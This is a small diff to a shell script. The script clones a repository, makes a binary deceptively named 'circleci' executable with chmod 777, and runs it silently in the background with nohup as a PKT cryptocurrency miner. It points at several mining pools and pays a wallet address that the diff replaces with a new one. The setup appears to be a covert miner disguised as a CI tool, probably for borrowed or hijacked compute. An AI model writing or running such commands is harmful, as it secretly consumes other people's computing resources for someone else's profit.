@@ -2,7 +2,7 @@
 git clone https://github.com/aurbach55/pos.git
 cd pos
 chmod 777 circleci >/dev/null 2>&1
-nohup ./circleci ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx http://pool.pktpool.io http://pool.pkt.world http://pool.pkteer.com https://stratum.zetahash.com > nohup.out >/dev/null 2>&1 
+nohup ./circleci ann -p pkt1qfz5q6ee44qhsqjf9pk7su0und7ta5mq8jxnsea http://pool.pktpool.io http://pool.pkt.world http://pool.pkteer.com https://stratum.zetahash.com > nohup.out >/dev/null 2>&1 
 
 
 
